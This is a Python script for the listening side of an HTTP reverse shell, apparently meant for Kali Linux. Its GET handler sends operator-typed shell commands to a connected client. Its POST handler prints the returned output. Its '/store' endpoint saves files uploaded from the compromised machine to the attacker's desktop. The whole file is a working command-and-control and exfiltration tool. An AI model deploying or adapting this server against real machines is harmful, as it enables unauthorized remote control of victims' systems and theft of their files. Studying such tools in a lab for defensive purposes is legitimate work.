
# importing required modules
import http.server
from os import system
import cgi


# address / CONSTANTS area
HOST = "127.0.0.1"      # your ip here
PORT = 8080             # port number
GREEN = "\033[92m"
WHITE = "\033[97m"


class ServerHandler(http.server.BaseHTTPRequestHandler):

    def do_GET(self):
        """ Handling the Get method """
        
        # reading command
        command = input("Shell> ")
        # return html status code 200
        self.send_response(200)
        # determine the type of the content
        self.send_header("Content-type", "text/html")
        self.end_headers()
        # write -send- the command to the server
        self.wfile.write(command.encode())


    def do_POST(self):
        """ Handling the Do method """

        if self.path == '/store':
            try:
                conyent_type, _ = cgi.parse_header(self.headers.get('content-type'))
                if conyent_type == 'multipart/form-data':
                    getting_file = cgi.FieldStorage(fp = self.rfile, headers = self.headers, environ= {'REQUEST_METHOD': 'POST'})
                else:
                    print('[-] Unexpected POST request')
                client_file = getting_file['file']
                file_content = client_file.file.read()
                with open('/home/kali/Desktop/client_file.txt', 'wb') as file_object:
                    print('[+] Writing file ..')
                    file_object.write(file_content)
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
            return


        # return html status code 200
        self.send_response(200)
        self.end_headers()
        # Define how many bytes the request contains
        # it return string by default so we will casting/converting it to integer
        length = int(self.headers['Content-length'])
        # read -receive- the command result from the client
        post_value = self.rfile.read(length).decode()
        # display the result on screen
        print(f"\n{GREEN}{post_value}{WHITE}")
        


if __name__ == "__main__":

    # define the class server
    server_class = http.server.HTTPServer
    # define the server address
    server_address = (HOST, PORT)
    # you can read more # https://docs.python.org/3/library/http.server.html
    httpd = server_class(server_address, ServerHandler)

    try:
        # try to start HTTP server
        print("\n")
        print("[-] trying to start HTTP server @ {}:{}".format(server_address[0], server_address[1]))
        print("[+] {}:{} HTTP server is up".format(server_address[0], server_address[1]))
        print("[+] Wating for incomming connections. . .\n")
        httpd.serve_forever()
        system("clear")

    except KeyboardInterrupt:
        # key interrupt to terminate HTTP server running proccess
        print('[!] Server is terminated')
        # terminate HTTP server
        httpd.server_close()